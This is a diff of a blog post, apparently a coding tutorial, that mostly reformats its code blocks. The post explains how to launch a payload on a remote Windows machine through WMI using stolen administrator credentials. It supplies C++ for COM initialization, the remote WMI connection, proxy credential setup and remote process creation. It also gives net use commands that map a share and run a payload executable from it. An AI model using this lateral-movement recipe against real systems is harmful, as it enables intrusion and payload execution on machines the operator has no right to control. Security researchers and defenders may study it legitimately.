@@ -8,7 +8,7 @@ category: CodeSamples
 Here's a sample on how to launch a custom executable/payload on a remote machine using WMI. Obviously, valid credentials have to be stolen first before you can connect to the remote machine. The user who is trying to access the remote machine, should be a member of the Local administrators group on the remote machine. 
 
 Here are the basic steps:
-* The first step is to initialize the COM infrastructure.
+1. The first step is to initialize the COM infrastructure.
 
     {% highlight cpp %}
     //-- Initialize COM.
@@ -37,8 +37,7 @@ Here are the basic steps:
 
 2. Next, create an instance of the Wbem locator and connect to the "root\cimv2" WMI namespace of the remote machine. Since we were connecting to a remote machine, the namespace should be fully qualified : "\\\\<server>\\root\\cimv2"
 
-
-
+    {% highlight cpp %}
 	//-- Obtain the WMI locator to pointer
 	hres = CoCreateInstance(
 		CLSID_WbemLocator,
@@ -62,12 +61,12 @@ Here are the basic steps:
 		NULL,                              // Context object 
 		&pSvc                              // IWbemServices proxy
 		);
+    {% endhighlight %}
 
 3. After you retrieve a pointer to an IWbemServices proxy, you must set the security on the proxy to access WMI on the remote machine through the proxy. This step is compulsary because IWbemServices proxy will only grants access to an out-of-process or remote object if the security properties are correct.
 
-    // Ref: https://msdn.microsoft.com/en-us/library/aa393619(v=vs.85).aspx
-	
-	authIdent.PasswordLength = wcslen(wstrPassword.c_str());
+    {% highlight cpp %}
+    authIdent.PasswordLength = wcslen(wstrPassword.c_str());
 	authIdent.Password = (USHORT*)wstrPassword.c_str();
 	authIdent.UserLength = wcslen(wstrUserName.c_str());
 	authIdent.User = (USHORT*)wstrUserName.c_str();
@@ -88,9 +87,11 @@ Here are the basic steps:
 		userAcct,                       // client identity  <--- ideally you have to create COAUTHIDENTITY  class 
 		EOAC_NONE                       // proxy capabilities 
 		);
+    {% endhighlight %}
 
 4. If you have a pointer to the IWbemServices proxy - it means you have a successful connection to the WMI namespace on the remote machine. To drop the payload and launch the attack - you need to be able to create a process on the remote machine first. I've seperated this part into a function of its own, you pass in the IWbemServices proxy, and the process name and arguments as input. Refer to the function snippet below:
 
+    {% highlight cpp %}
     /*-Refernce : https://msdn.microsoft.com/en-us/library/aa390421(v=vs.85).aspx -*/
     DWORD CreateProcessOnRemote(IWbemServices *pSvc, std::wstring wstrProcessName, std::wstring wstrProcessArgs)
     {
@@ -202,14 +203,14 @@ Here are the basic steps:
 
         return hres;
     }
+    {% endhighlight %}
 
 5. Now all you need is the actual command to launch the payload. The approach I've used in my sample is to map a network share, and then launch the payload from that share. This involves running the following commands in sequence:
-
+```
     net use \\<servername>\<sharename> /user:<username> <password>
     \\<servername>\<sharename>\<payload.exe> <switches>
     net use \\<servername>\<sharename> /delete
-
+```
 6. Once the process is launched, you decide what the payload must do. This code simply cleans up and exits. 
-
 
 For full source, refer: https://github.com/VimalShekar/Cpp/tree/master/src/WmiRemoteProcessLaunch
